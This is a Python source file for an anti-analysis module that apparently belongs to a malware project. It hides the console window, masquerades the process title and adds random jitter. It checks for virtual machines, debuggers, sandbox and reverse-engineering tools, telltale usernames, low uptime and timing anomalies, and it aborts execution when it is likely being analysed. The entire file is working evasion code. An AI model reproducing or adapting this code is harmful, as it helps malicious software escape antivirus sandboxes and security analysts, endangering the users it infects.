# Stealth and Anti-Detection Module
# Implements various techniques to avoid detection and analysis

import sys
import os
import ctypes
import time
import random
import logging
from config import SILENT_MODE, DEBUG_MODE, PROCESS_NAME_MASQUERADE, HIDE_CONSOLE

class StealthManager:
    
    def __init__(self):
        self.setup_logging()
        self.is_windows = sys.platform == "win32"
        
    def setup_logging(self):
        if SILENT_MODE:
            logging.disable(logging.CRITICAL)
        elif DEBUG_MODE:
            logging.basicConfig(
                level=logging.DEBUG,
                format='%(asctime)s - %(levelname)s - %(message)s'
            )
        else:
            logging.basicConfig(level=logging.ERROR)
    
    def initialize_stealth(self):
        try:
            if self.is_windows:
                self.masquerade_process()
                if HIDE_CONSOLE:
                    self.hide_console_window()
            return True
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"Stealth initialization failed: {e}")
            return False
    
    def masquerade_process(self, fake_name=None):
        if not self.is_windows:
            return False
            
        try:
            fake_name = fake_name or PROCESS_NAME_MASQUERADE
            ctypes.windll.kernel32.SetConsoleTitleW(fake_name)
            return True
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"Process masquerading failed: {e}")
            return False
    
    def hide_console_window(self):
        if not self.is_windows:
            return False
            
        try:
            import win32gui
            import win32con
            
            hwnd = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            
            console_hwnd = win32gui.FindWindow("ConsoleWindowClass", None)
            if console_hwnd:
                win32gui.ShowWindow(console_hwnd, win32con.SW_HIDE)
            
            return True
        except ImportError:
            # Fallback method using ctypes
            try:
                ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0
                )
                return True
            except Exception:
                return False
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"Console hiding failed: {e}")
            return False
    
    def add_jitter(self, min_delay=None, max_delay=None):
        """Add random delay to avoid behavioral detection"""
        from config import JITTER_MIN, JITTER_MAX
        
        min_delay = min_delay or JITTER_MIN
        max_delay = max_delay or JITTER_MAX
        
        delay = random.uniform(min_delay, max_delay)
        time.sleep(delay)
        return delay
    
    def detect_analysis_environment(self):
        indicators = []
        
        try:
            vm_indicators = self._check_vm_artifacts()
            if vm_indicators:
                indicators.extend(vm_indicators)
            
            debugger_indicators = self._check_debugger_presence()
            if debugger_indicators:
                indicators.extend(debugger_indicators)
            
            sandbox_indicators = self._check_sandbox_artifacts()
            if sandbox_indicators:
                indicators.extend(sandbox_indicators)
                
            timing_indicators = self._check_timing_attacks()
            if timing_indicators:
                indicators.extend(timing_indicators)
                
            return indicators
            
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"Environment detection failed: {e}")
            return []
    
    def _check_vm_artifacts(self):
        """Check for virtual machine artifacts"""
        artifacts = []
        
        if self.is_windows:
            try:
                import wmi
                c = wmi.WMI()
                
                # Check BIOS information
                for bios in c.Win32_BIOS():
                    if any(keyword in bios.SerialNumber.lower() for keyword in ['vmware', 'virtualbox', 'qemu', 'xen']):
                        artifacts.append(f"VM BIOS Serial: {bios.SerialNumber}")
                
                # Check MAC address prefixes
                for nic in c.Win32_NetworkAdapterConfiguration():
                    if nic.MACAddress:
                        mac = nic.MACAddress.lower()
                        vm_mac_prefixes = ['00:0c:29', '00:1c:14', '00:50:56', '08:00:27', '52:54:00']
                        if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
                            artifacts.append(f"VM MAC Address: {nic.MACAddress}")
                
                # Check processes
                vm_processes = ['vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe', 'vboxservice.exe', 'vboxtray.exe']
                for process in c.Win32_Process():
                    if process.Name.lower() in vm_processes:
                        artifacts.append(f"VM Process: {process.Name}")
                        
            except ImportError:
                # Fallback WMI-less checks
                artifacts.extend(self._check_vm_artifacts_fallback())
        
        return artifacts
    
    def _check_vm_artifacts_fallback(self):
        """Fallback VM detection without WMI"""
        artifacts = []
        
        try:
            import subprocess
            
            # Check common VM registry keys
            vm_registry_paths = [
                r"SOFTWARE\Oracle\VirtualBox",
                r"SOFTWARE\VMware, Inc.\VMware Tools",
                r"SYSTEM\CurrentControlSet\Services\VBoxService",
                r"SYSTEM\CurrentControlSet\Services\VMTools"
            ]
            
            if sys.platform == "win32":
                import winreg
                for path in vm_registry_paths:
                    try:
                        winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                        artifacts.append(f"VM Registry Key: {path}")
                    except FileNotFoundError:
                        continue
                        
        except Exception:
            pass
            
        return artifacts
    
    def _check_debugger_presence(self):
        """Check for debugger presence"""
        debugger_indicators = []
        
        if self.is_windows:
            try:
                import ctypes
                from ctypes import wintypes
                
                # Check IsDebuggerPresent
                is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent()
                if is_debugger_present:
                    debugger_indicators.append("Debugger detected via IsDebuggerPresent")
                
                # Check Remote Debugger Present
                is_remote_debugger_present = ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                    ctypes.windll.kernel32.GetCurrentProcess(), 
                    ctypes.byref(ctypes.c_bool(False))
                )
                if is_remote_debugger_present:
                    debugger_indicators.append("Remote debugger detected")
                
                # Check NtGlobalFlag
                peb = ctypes.windll.ntdll.NtQueryInformationProcess(
                    ctypes.windll.kernel32.GetCurrentProcess(),
                    0,  # ProcessBasicInformation
                    ctypes.byref(ctypes.c_ulong()),
                    ctypes.sizeof(ctypes.c_ulong()),
                    ctypes.byref(ctypes.c_ulong())
                )
                
            except Exception:
                pass
        
        return debugger_indicators
    
    def _check_sandbox_artifacts(self):
        """Check for sandbox environment artifacts"""
        sandbox_indicators = []
        
        try:
            # Check for common sandbox tools
            sandbox_processes = [
                'wireshark.exe', 'fiddler.exe', 'procmon.exe', 'procexp.exe',
                'ollydbg.exe', 'x64dbg.exe', 'ida.exe', 'ida64.exe',
                'vboxservice.exe', 'vboxtray.exe', 'vmtoolsd.exe'
            ]
            
            if self.is_windows:
                import subprocess
                result = subprocess.run(['tasklist'], capture_output=True, text=True)
                for process in sandbox_processes:
                    if process.lower() in result.stdout.lower():
                        sandbox_indicators.append(f"Sandbox tool detected: {process}")
            
            # Check for typical sandbox usernames
            import getpass
            current_user = getpass.getuser().lower()
            sandbox_users = ['sandbox', 'malware', 'test', 'virus', 'sample', 'honeypot']
            if any(sandbox_user in current_user for sandbox_user in sandbox_users):
                sandbox_indicators.append(f"Suspicious username: {current_user}")
                
            # Check system uptime (sandboxes often have low uptime)
            if self.is_windows:
                try:
                    import ctypes
                    kernel32 = ctypes.windll.kernel32
                    uptime = kernel32.GetTickCount64() / 1000 / 60  # Convert to minutes
                    if uptime < 30:  # Less than 30 minutes
                        sandbox_indicators.append(f"Low system uptime: {uptime:.1f} minutes")
                except Exception:
                    pass
                    
        except Exception:
            pass
        
        return sandbox_indicators
    
    def _check_timing_attacks(self):
        timing_indicators = []
        
        try:
            import time
            
            # CPU timing check
            start_time = time.perf_counter()
            result = sum(i * i for i in range(1000))
            end_time = time.perf_counter()
            
            execution_time = end_time - start_time
            
            if execution_time > 0.1:  # 100ms threshold
                timing_indicators.append(f"Slow execution detected: {execution_time:.4f}s")
            
            # Sleep timing check 
            sleep_duration = 0.1
            start_time = time.perf_counter()
            time.sleep(sleep_duration)
            end_time = time.perf_counter()
            
            actual_sleep = end_time - start_time
            if actual_sleep < sleep_duration * 0.9:  # Sleep was skipped/shortened
                timing_indicators.append(f"Sleep timing anomaly: {actual_sleep:.4f}s vs {sleep_duration}s")
                
        except Exception:
            pass
        
        return timing_indicators
    
    def safe_execute(self, func, *args, **kwargs):
        """Safely execute function with anti-analysis protection"""
        try:
            # Add random delays to confuse timing analysis
            self.add_jitter(0.01, 0.05)
            
            # Check for analysis environment before execution
            if self.should_abort_execution():
                return None
                
            return func(*args, **kwargs)
            
        except Exception:
            return None
    
    def should_abort_execution(self):
        """Determine if execution should be aborted due to analysis environment"""
        try:
            indicators = self.detect_analysis_environment()
            
            # Define risk thresholds
            risk_score = len(indicators)
            high_risk_indicators = ['Debugger detected', 'Remote debugger detected']
            
            # Abort if any high-risk indicators are present
            if any(indicator in ' '.join(indicators) for indicator in high_risk_indicators):
                return True
            
            # Abort if too many indicators are present
            if risk_score >= 3:
                return True
                
            return False
            
        except Exception:
            return False

# Global stealth manager instance
stealth_manager = StealthManager()